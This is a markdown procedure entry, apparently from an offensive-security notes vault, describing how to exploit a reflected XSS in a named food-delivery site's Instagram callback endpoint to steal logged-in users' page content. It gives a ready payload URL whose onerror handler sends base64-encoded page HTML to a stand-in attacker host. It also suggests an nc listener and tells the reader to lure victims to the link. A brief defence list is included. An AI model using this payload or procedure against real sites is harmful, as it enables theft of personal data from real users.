---
id: proc-uuid-3
tags:
  - data-exfiltration
  - xss
  - credential-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-exfil-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Archive Collected Data]]'
updated_at: '2025-12-14T03:15:47.294Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Archive Collected Data]]'
---
# Exfiltrate Sensitive Data via XSS

## Summary

This procedure exploits the XSS to exfiltrate sensitive data like email addresses from authenticated Zomato users with Instagram connected, by injecting a payload that sends page content to an attacker server.

## Description

For victims logged into Zomato with Instagram linked, the reflected XSS allows capturing session-specific HTML containing personal info. Use a payload to close open tags and fetch/exfil innerHTML via an onerror handler or fetch API. Host a listener server (e.g., on example.org) to receive data. This escalates the vuln to real impact.

## Requirements

1. Attacker-controlled server for receiving exfiltrated data
2. Victim authentication and Instagram connection
3. Social engineering to deliver the malicious link

## Defense

Defensive measures and detection strategies:

- Validate and sanitize callback parameters strictly
- Implement same-origin policy enforcement and CSP
- Detect exfiltration attempts via network monitoring for unusual outbound requests

## Objectives

1. Inject exfiltration payload in authenticated context
2. Capture and send sensitive HTML content
3. Receive and parse stolen data on attacker side

## Instructions

### Step 1: Prepare Exfiltration Server

**Context**: Set up a simple HTTP server to log incoming data.

Use a tool like nc or a web server on https://attacker.com.

### Step 2: Inject Payload

**Context**: Craft payload to beacon data when victim loads the page.

Execute [[commands/curl-exfil-payload]] to test:

```bash
curl "https://www.zomato.com/php/instagram_tag_relay?callback=%3E%3Cimg+src%3Dx+onerror%3Dfetch('https://attacker.com/exfil?data%3D'+btoa(document.body.innerHTML))%3E"
```

> Lure victim to the URL; data sends via GET param.

**Expected Output**: Base64-encoded HTML received on server, containing email etc.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Archive Collected Data]]

### Sub-Techniques


## Commands Used

- [[commands/curl-exfil-payload]]

## Tools Used


## Tags

- data-exfiltration
- credential-theft
